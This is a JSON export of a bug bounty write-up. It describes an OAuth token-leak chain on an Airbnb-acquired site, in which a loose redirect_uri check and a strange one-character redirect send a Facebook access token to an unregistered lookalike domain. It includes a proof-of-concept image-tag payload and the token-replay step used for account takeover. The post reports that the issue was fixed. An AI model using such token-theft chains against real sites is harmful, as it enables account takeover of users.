{"id":190,"date":"2019-07-10T16:16:35","date_gmt":"2019-07-10T13:16:35","guid":{"rendered":"https:\/\/xpoc.pro\/?p=190"},"modified":"2019-07-11T03:52:05","modified_gmt":"2019-07-11T00:52:05","slug":"oauth-authentication-bypass-on-airbnb-acquisition-using-weird-1-char-open-redirect","status":"publish","type":"post","link":"https:\/\/xp.ht\/oauth-authentication-bypass-on-airbnb-acquisition-using-weird-1-char-open-redirect\/","title":{"rendered":"OAuth authentication bypass on Airbnb acquisition using 1-char Open Redirect"},"content":{"rendered":"\n<p style=\"text-align:justify\">This finding was a part of Hack the World 2017 event. <br>TL;DR: it was possible to leak Facebook <strong>access_token<\/strong> to the external domain, and authorize on the site on behalf of the user using this token.<\/p>\n\n\n\n<p style=\"text-align:justify\">The interesting part is not the vulnerability itself (we know that open redirects and referer leaks are usual ways to leak the tokens), but how the Open Redirect for the chain was found.<br><\/p>\n\n\n\n<blockquote class=\"wp-block-quote\"><p>The <em>Murphy&#8217;s law<\/em> of Open Redirects: when you need open redirect &#8211; there is no open redirect. <br><br><\/p><\/blockquote>\n\n\n\n<p style=\"text-align:justify\">I will tell the story from the beginning &#8211; when I started to look for a target for the Hack the World 2017 event. Airbnb program awarded double points for the discovered vulnerabilities and offered nice bounties, so I started to explore their assets.<\/p>\n\n\n\n<p style=\"text-align:justify\">I stopped on the <strong>luxuryretreats.com&nbsp;<\/strong>domain. After an hour of poking around, I noticed that redirect_uri check on the  <br>https:\/\/auth2.luxuryretreats.com\/api\/ExternalWebUser\/GetRedirectUri endpoint (which was used for Facebook authentication) doesn&#8217;t have strict uri check, and allowed arbitrary paths in the redirect_uri parameter: <\/p>\n\n\n\n<pre>https:\/\/auth2.luxuryretreats.com\/api\/ExternalWebUser\/GetRedirectUri?provider=facebook&amp;response_type=token&amp;client_id=1398719173725670&amp;redirect_uri=https:\/\/www.luxuryretreats.com%2Fexternal_authentication<\/pre>\n\n\n\n<p style=\"text-align:justify\">There was no luck with common host validation bypasses techniques, such as HPP and URI manipulations &#8211; and there was a strict check for <pre>https:\/\/luxuryretreats.com\/<\/pre> string on the beginning of the redirect_uri parameter. I could control only the path, and sadly, there was no visible open redirect issues on the site. I tried to search for areas where I could exfiltrate token to the controlled destination via Referer header &#8211; without success.\n<\/p>\n\n\n\n<h4 class=\"wp-block-heading\">Approaching the Open Redirect<\/h4>\n\n\n\n<blockquote class=\"wp-block-quote\"><p>Fix your Open Redirects when they are in low impact state before they start to be dangerous.<\/p><\/blockquote>\n\n\n\n<p style=\"text-align:justify\">I will write a separate article about why in my opinion even low-impact open redirects (especially which came from server-side misconfigurations) should be fixed or hardened to prevent any unexpected behavior. It&#8217;s better to issue even 10$ bounty for such open redirects and make the life a little harder for hackers than move it to the out-of-scope section.<\/p>\n\n\n\n<p>Anyway, I started to think about how can I leak the token. Usually, if there is no easy ways to do this, I start to look for misconfigurations and do extended content discovery (such as fuzzing URL parameter names, paths, exploring JS files, etc). Doing this, I&#8217;m looking for any unusual behavior.<\/p>\n\n\n\n<p style=\"text-align:justify\">And, I noticed one thing that caught my eye upon fuzzing the path &#8211; sometimes  <br><b>https:\/\/www.luxuryretreats.com\/[path]<\/b> redirects to the  <br><b>https:\/\/www.luxuryretreats.com\/vacation-rentals<\/b> &#8211; but only if specific path is given<br>During fuzzing, I noticed interesting behavior with 1-char paths:<br>when this char is present in the hostname, the 301 redirect will be issued, where the char is replaced by <strong>vacation-rentals<\/strong> string in both path and hostname! E.g.  <br><b>https:\/\/www.luxuryretreats.com\/u<\/b> -&gt; <br><b>https:\/\/www.luxvacation-rentalsryretreats.com\/vacation-rentals<\/b><br>This is not traditional open redirect, and most likely it was a flaw in the redirect rules on the server, but it was enough to leak the token to the external host! Luckily (for me), this domain was not registered and could be claimed<\/p>\n\n\n\n<p><\/p>\n\n\n\n<p><h5>POC:<\/h5><\/p>\n\n\n\n<pre>&lt;img src=\"https:\/\/auth2.luxuryretreats.com\/api\/ExternalWebUser\/GetRedirectUri?provider=facebook&amp;response_type=token&amp;client_id=1398719173725670&amp;redirect_uri=https:\/\/www.luxuryretreats.com%2Fu&amp;\"&gt;<\/pre>\n\nResult:\n<pre>https:\/\/www.luxvacation-rentalsryretreats.com\/vacation-rentals?external_access_token=[token]<\/pre>\n\nAfter this, the attacker sends the token to the OAuth endpoint:\n<pre>https:\/\/www.luxuryretreats.com\/externalAuthentication?external_access_token=[token]<\/pre> and successfully authorizes on behalf of the user with full control of the account.\n\nThe Airbnb team fixed this issue very fast, and changed OAuth implementation.\n\n\n\n<p style=\"text-align:justify\"><h4>Lessons learned<\/h4>1)  Discovery of the short paths can be useful &#8211; I generated a list which consists of combinations of [a-zA-Z0-9] up to 3 chars inclusively in length and added it to my wordlists. It helped me a lot of times.<br>2) In most cases, you likely can leak data even if there are no visible open redirects\/referer tricks &#8211; just dig deeper.<br>3) If the <strong>redirect_uri<\/strong> check isn&#8217;t strict, even if it looks secure &#8211; research it!<\/p>\n\n\n\n<p><\/p>\n","protected":false},"excerpt":{"rendered":"<p>This finding was a part of Hack the World 2017 event. TL;DR: it was possible to leak Facebook access_token to the external domain, and authorize on the site on behalf of the user using this token.<\/p>\n","protected":false},"author":1,"featured_media":0,"comment_status":"closed","ping_status":"closed","sticky":false,"template":"","format":"standard","meta":{"footnotes":""},"categories":[2],"tags":[],"_links":{"self":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts\/190"}],"collection":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/comments?post=190"}],"version-history":[{"count":52,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts\/190\/revisions"}],"predecessor-version":[{"id":480,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts\/190\/revisions\/480"}],"wp:attachment":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/media?parent=190"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/categories?post=190"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/tags?post=190"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}